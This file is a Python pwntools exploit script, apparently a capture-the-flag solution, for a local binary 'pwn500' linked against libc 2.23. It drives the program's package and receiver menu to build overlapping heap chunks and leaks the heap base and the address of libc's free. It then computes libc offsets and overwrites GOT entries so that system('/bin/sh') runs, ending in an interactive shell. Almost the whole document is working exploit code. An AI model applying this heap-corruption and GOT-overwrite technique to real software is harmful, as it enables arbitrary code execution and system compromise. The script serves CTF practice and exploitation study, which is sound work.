from pwn import *
import time

def begin(yes = True):
    global p
    p.recvuntil("(y or n)?")
    if yes:
        p.sendline('y')
    else:
        p.sendline('n')                     

#sender level
def set_sender_info(name, contact):
    global p
    p.recvuntil('your choice : ')
    p.sendline('1')
    p.recvuntil('your name?')
    p.sendline(name) 
    p.recvuntil('your contact?')
    p.sendline(contact)
 
def new_receiver():
    global p
    p.recvuntil('your choice : ')
    p.sendline('2')

def edit_receiver(index, name, postcode, contact, address):
    global p
    p.recvuntil('your choice : ')
    p.sendline('3')
    p.recvuntil('want to edit?')
    p.sendline(str(index))
    p.recvuntil('your name?')
    p.send(name)
    p.recvuntil('your postcodes?')
    p.send(postcode)
    p.recvuntil('your contact?')
    p.send(contact)
    p.recvuntil('your address?')
    p.sendline(address)

def del_receiver(index):
    global p
    p.recvuntil('your choice : ')
    p.sendline('4')
    p.recvuntil('want to delete?')
    p.sendline(str(index))
 
def show_all_receivers():
    global p
    p.recvuntil('your choice : ')
    p.sendline('5')

def submit_all_packages():
    global p
    p.recvuntil('your choice : ')
    p.sendline('6')

def exit_sender():
    global p
    p.recvuntil('your choice : ')
    p.sendline('7')

def end():
    global p
    p.recvuntil('y or n)?')
    p.sendline('n')
    p.recvuntil('home :(')
    
 
#current receiver and its packages level 
 
def set_current_receiver_info(name, postcode, contact, address):
    global p
    p.recvuntil('your choice : ')
    p.sendline('1')
    p.recvuntil('your name?')
    p.sendline(name)
    p.recvuntil('your postcodes?')
    p.sendline(postcode)
    p.recvuntil('your contact?')
    p.sendline(contact)
    p.recvuntil('your address?')
    p.sendline(address)


def new_package(length, content):
    global p
    p.recvuntil('your choice : ')
    p.sendline('2')
    p.recvuntil('length of your package?')
    p.sendline(str(length))
    p.recvuntil('your package~')
    if len(content)==length:
        p.send(content)
    else:
        p.sendline(content)
 
def del_package(package_index):
    global p
    p.recvuntil('your choice : ')
    p.sendline('3')
    p.recvuntil('want to delete?')
    p.sendline(str(package_index))
 
def show_packages():
    global p
    p.recvuntil('your choice : ')
    p.sendline('4')
 
def save_package():
    global p
    p.recvuntil('your choice : ')
    p.sendline('5')
 
def exit_package():
    global p
    p.recvuntil('your choice : ')
    p.sendline('6')

context.arch='amd64'
context.os='linux'
context.endian='little'
context.word_size=64
#context.log_level = 'debug'

elf = ELF('./pwn500')

plt_write = elf.symbols['puts']
got_write = elf.got['puts']

print hex(plt_write), hex(got_write)

p = process("./pwn500", env={"LD_PRELOAD":"./libc-2.23.so"})
gdb.attach(proc.pidof(p)[0], 'b *0x04015F0\nc\n')
#gdb.attach(proc.pidof(p)[0], 'c\n')

addr_control = 0x6030b8

#begin game
begin()

set_sender_info('/bin/sh', 'BBBB')
new_receiver()
set_current_receiver_info('AAAA','BBBB','CCCC','DDDD')
new_package(0x1f0,'aaaa'*4)
new_package(0x1f0,'bbbb'*4)
new_package(0x1f0,'dddd'*4)
del_package(2)
del_package(1)
new_package(0x1f0,'e'*0x1f0)    #shrink free chunk
save_package()                  #return to receiver_log()
new_receiver()
set_current_receiver_info('AAAA','BBBB','CCCC','DDDD')
save_package()   #save pointers to packages in the receiver
new_receiver()
set_current_receiver_info('BBBB','BBBB','CCCC','DDDD')
save_package()   #save pointers to packages in the receiver

#overlap
del_receiver(2)
del_receiver(1)
new_receiver()
set_current_receiver_info('CCCC','BBBB','CCCC','DDDD')  #allocated at the first receiver position
del_package(1)
new_package(0x1f0, 'b'*0x98+p64(0x0)+p64(0xc1)+p64(addr_control-0x20))
save_package()
show_all_receivers()

p.recvuntil('======receiver[2]=======')
p.recvuntil('postcodes:')
heap_base = u64(p.recvline()[0:-1].ljust(8, '\x00')) - 0x10
print '--- heap base:0x%x' % heap_base


new_receiver()
set_current_receiver_info('DDDD','BBBB','CCCC','DDDD')  
del_package(0)
new_package(0x1f0, 'b'*0x98+p64(0x0)+p64(0xc1)+p64(0x603000-0x18))
save_package()
show_all_receivers()
p.recvuntil('======receiver[3]=======')
p.recvuntil('contact:')
addr_free = u64(p.recv(6).ljust(8,'\x00'))
print '--- leak free addr:0x%x' % addr_free 

#calculate addresses of GLIBC API

off_system = 0x45390 - 0x844f0
off_puts = 0x6f690 - 0x844f0
off_read = 0xf7250- 0x844f0
off_malloc = 0x83580 - 0x844f0

addr_system = addr_free + off_system 
addr_puts = addr_free + off_puts
addr_read = addr_free + off_read
addr_malloc = addr_free + off_malloc

print 'system:0x%x,puts:0x%x,read:0x%x' % (addr_system, addr_puts, addr_read)

#modify GOT
new_receiver()
set_current_receiver_info('FFFF','BBBB','CCCC','DDDD')  
del_package(0)
new_package(0x1f0, 'b'*0x98+p64(0x0)+p64(0xc1)+p64(heap_base))
save_package()

edit_receiver(4, p64(0x603008)[0:8], p64(heap_base+0x40)[0:8], 'b'*8, 'c'*8) 
edit_receiver(0, p64(addr_system)[0:8], p64(addr_puts)[0:8], p64(addr_read)[0:8], p64(addr_malloc)[0:8]) 

print 'submit all packages'
submit_all_packages()

p.interactive()
